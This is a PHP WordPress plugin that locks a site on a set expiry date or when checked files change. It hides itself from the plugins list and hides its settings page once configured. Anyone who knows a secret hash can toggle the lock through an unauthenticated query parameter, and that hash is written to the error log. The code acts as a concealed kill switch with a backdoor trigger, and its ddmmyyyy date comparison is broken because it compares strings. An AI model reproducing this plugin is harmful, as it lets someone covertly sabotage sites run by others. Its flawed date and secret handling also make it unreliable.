<?php
/**
 * Plugin Name: Lock Site Plugin
 * Description: Locks the site based on file integrity checks, a secret hash, and a modification date.
 * Version: 1.0
 * Author: Your Name
 */

// Prevent direct access
if (!defined('ABSPATH')) {
    exit;
}

// Define plugin constants
define('LOCK_SITE_PLUGIN_FILE', __FILE__);

// Check if the plugin is running as a must-use plugin
function is_mu_plugin() {
    return strpos(LOCK_SITE_PLUGIN_FILE, WPMU_PLUGIN_DIR) !== false;
}

// Register activation hook to set up the plugin (only for normal plugins)
if (!is_mu_plugin()) {
    register_activation_hook(LOCK_SITE_PLUGIN_FILE, 'lock_site_plugin_activate');
}

function lock_site_plugin_activate() {
    // Redirect to the settings page after activation
    add_option('lock_site_plugin_do_activation_redirect', true);
}

// Redirect to the settings page after activation (only for normal plugins)
if (!is_mu_plugin()) {
    add_action('admin_init', 'lock_site_plugin_redirect');
}

function lock_site_plugin_redirect() {
    if (get_option('lock_site_plugin_do_activation_redirect', false)) {
        delete_option('lock_site_plugin_do_activation_redirect');
        wp_redirect(admin_url('options-general.php?page=lock-site-settings'));
        exit;
    }
}

// Add settings page (for both normal and must-use plugins)
add_action('admin_menu', 'lock_site_plugin_add_settings_page');

function lock_site_plugin_add_settings_page() {
    // Only show settings page if settings haven't been saved yet
    if (!get_option('lock_site_settings_configured', false)) {
        add_options_page(
            'Lock Site Settings',
            'Lock Site',
            'manage_options',
            'lock-site-settings',
            'lock_site_plugin_render_settings_page'
        );
    }
}

function lock_site_plugin_render_settings_page() {
    if (!current_user_can('manage_options')) {
        wp_die('You do not have sufficient permissions to access this page.');
    }

    // Handle form submission
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['lock_site_settings_nonce'])) {
        if (wp_verify_nonce($_POST['lock_site_settings_nonce'], 'lock_site_settings')) {
            $expected_hash = sanitize_text_field($_POST['expected_hash']);
            $last_allowed_date = sanitize_text_field($_POST['last_allowed_date']);

            // Save settings using WordPress options
            if (lock_site_plugin_update_settings($expected_hash, $last_allowed_date)) {
                update_option('lock_site_settings_configured', true);
                echo '<div class="notice notice-success"><p>Settings saved successfully. The plugin is now active and this settings page will be hidden for security.</p></div>';
                // Redirect to main settings page after a short delay
                echo '<script>setTimeout(function() { window.location.href = "' . admin_url('options-general.php') . '"; }, 3000);</script>';
            } else {
                echo '<div class="notice notice-error"><p>Failed to save settings.</p></div>';
            }
        }
    }

    // Render the settings form
    ?>
    <div class="wrap">
        <h1>Lock Site Settings</h1>
        <form method="post">
            <?php wp_nonce_field('lock_site_settings', 'lock_site_settings_nonce'); ?>
            <table class="form-table">
                <tr>
                    <th scope="row"><label for="expected_hash">Expected Hash</label></th>
                    <td>
                        <input type="text" name="expected_hash" id="expected_hash" value="<?php echo esc_attr(get_option('lock_site_expected_hash', '')); ?>" required>
                        <p class="description">Enter the secret hash for unlocking the site.</p>
                    </td>
                </tr>
                <tr>
                    <th scope="row"><label for="last_allowed_date">Last Allowed Modification Date</label></th>
                    <td>
                        <input type="text" name="last_allowed_date" id="last_allowed_date" value="<?php echo esc_attr(get_option('lock_site_last_allowed_date', '')); ?>" required>
                        <p class="description">Enter the date in "ddmmyyyy" format (e.g., 12022025 for 12 Feb 2025).</p>
                    </td>
                </tr>
            </table>
            <?php submit_button('Save Settings'); ?>
        </form>
    </div>
    <?php
}

function lock_site_plugin_update_settings($expected_hash, $last_allowed_date) {
    // Only update if both values are provided
    if (!empty($expected_hash) && !empty($last_allowed_date)) {
        update_option('lock_site_expected_hash', $expected_hash);
        update_option('lock_site_last_allowed_date', $last_allowed_date);
        return true;
    }
    return false;
}

// Hide the plugin from the plugins list if it's a normal plugin
if (!is_mu_plugin()) {
    add_filter('all_plugins', 'lock_site_plugin_hide_from_list');

    function lock_site_plugin_hide_from_list($plugins) {
        unset($plugins[plugin_basename(LOCK_SITE_PLUGIN_FILE)]);
        return $plugins;
    }
}

// Register secure POST endpoints
add_action('admin_post_lock_site_toggle', 'lock_site_plugin_handle_toggle');
add_action('admin_post_lock_site_update_checksums', 'lock_site_plugin_handle_update_checksums');

function lock_site_plugin_handle_toggle() {
    if (!isset($_POST['nonce']) || !wp_verify_nonce($_POST['nonce'], 'lock_site_toggle')) {
        wp_die('Invalid request.');
    }

    toggle_site_lock();
}

function lock_site_plugin_handle_update_checksums() {
    if (!isset($_POST['nonce']) || !wp_verify_nonce($_POST['nonce'], 'lock_site_update_checksums')) {
        wp_die('Invalid request.');
    }

    update_critical_file_checksums();
    wp_die('<h1>Success</h1><p>Checksums updated successfully.</p>');
}

// Toggle site lock state
function toggle_site_lock() {
    $current_hash = get_option('site_lock_hash', '');
    $expected_hash = get_option('lock_site_expected_hash', '');

    if (empty($current_hash)) {
        // Site is currently unlocked, so lock it
        if (!empty($expected_hash)) {
            update_option('site_lock_hash', $expected_hash);
            show_lock_message('The site is now restricted.');
        } else {
            wp_die('<h1>Error</h1><p>Cannot lock site: No expected hash is set.</p>');
        }
    } else {
        // Site is currently locked, so unlock it
        update_option('site_lock_hash', '');
        wp_redirect(home_url());
        exit;
    }
}

// Update critical file checksums
function update_critical_file_checksums() {
    $critical_files = array(
        'wp-config' => ABSPATH . 'wp-config.php',
        'lock-site' => __FILE__,
        'index' => ABSPATH . 'index.php',
        'wp-load' => ABSPATH . 'wp-load.php',
    );

    $checksums = array();
    foreach ($critical_files as $key => $file) {
        if (file_exists($file)) {
            $checksums[$key] = hash_file('sha256', $file);
        }
    }

    // Store checksums in multiple locations
    update_option('site_lock_checksums', $checksums);
    update_option('site_lock_checksums_backup', $checksums);

    // Store the current time from an external source if possible
    $current_time = time();
    update_option('site_lock_last_update', $current_time);
}

// Verify file integrity and enforce lock state
function verify_integrity() {
    // Check if site is locked
    $current_hash = get_option('site_lock_hash', '');
    if (!empty($current_hash)) {
        show_lock_message('The site is locked.');
        exit;
    }

    // Only enforce other checks if settings are configured
    $expected_hash = get_option('lock_site_expected_hash', '');
    $last_allowed_date = get_option('lock_site_last_allowed_date', '');
    if (empty($expected_hash) || empty($last_allowed_date)) {
        return;
    }

    $version = get_option('site_lock_version', 0);

    // Auto-initialize if first run
    if ($version === 0) {
        update_critical_file_checksums();
        return;
    }

    $stored_checksums = get_option('site_lock_checksums', array());
    $backup_checksums = get_option('site_lock_checksums_backup', array());

    // If no checksums exist, assume first run and initialize them
    if (empty($stored_checksums) || empty($backup_checksums)) {
        update_critical_file_checksums();
        return;
    }

    // Current hashes
    $critical_files = array(
        'wp-config' => ABSPATH . 'wp-config.php',
        'lock-site' => __FILE__,
        'index' => ABSPATH . 'index.php',
        'wp-load' => ABSPATH . 'wp-load.php',
    );

    foreach ($critical_files as $key => $file) {
        if (file_exists($file)) {
            $current_hash = hash_file('sha256', $file);
            if ($current_hash !== $stored_checksums[$key]) {
                show_lock_message('Security violation: Critical files have been modified. <br> 
                    If you made legitimate changes, visit: <br> 
                    <strong>' . admin_url('admin-post.php?action=lock_site_update_checksums') . '</strong> to allow the update.');
                exit;
            }
        }
    }

    // Verify time hasn't been rolled back and check last allowed date
    if (time() < get_option('site_lock_last_update', 0)) {
        show_lock_message('Security violation: System time manipulation detected.');
        exit;
    }

    // Check if current date is past the last allowed date
    $last_allowed_date = get_option('lock_site_last_allowed_date', '');
    if (!empty($last_allowed_date)) {
        $current_date = date('dmY');
        if ($current_date > $last_allowed_date) {
            show_lock_message('Site access expired. Please contact the administrator.');
            exit;
        }
    }

    // Enforce lock state
    $current_hash = get_option('site_lock_hash', '');
    if (!empty($current_hash)) {
        show_lock_message('The site is locked.');
        exit;
    }
}

// Show lock message
function show_lock_message($message) {
    wp_die('<h1>Site Locked</h1><p>' . esc_html($message) . '</p><p>Please contact the administrator.</p>');
}

// Run integrity check and enforce lock state on every request
add_action('wp', 'verify_integrity', 0);

// Check secret URLs on every request
add_action('init', 'lock_site_plugin_check_secret_urls', 0);

function lock_site_plugin_check_secret_urls() {
    error_log('Checking secret URLs...'); // Debugging statement

    // Handle ?unlock=EXPECTED_HASH
    $expected_hash = get_option('lock_site_expected_hash', '');
    if (isset($_GET['unlock']) && $_GET['unlock'] === $expected_hash && !empty($expected_hash)) {
        error_log('Secret URL triggered: ?unlock=' . $expected_hash); // Debugging statement
        toggle_site_lock();
        exit;
    }

    // Handle ?update_checksums=EXPECTED_HASH
    $expected_hash = get_option('lock_site_expected_hash', '');
    if (isset($_GET['update_checksums']) && $_GET['update_checksums'] === $expected_hash && !empty($expected_hash)) {
        error_log('Secret URL triggered: ?update_checksums=' . $expected_hash); // Debugging statement
        update_critical_file_checksums();
        die('<h1>Success</h1><p>Checksums updated successfully.</p>');
    }
}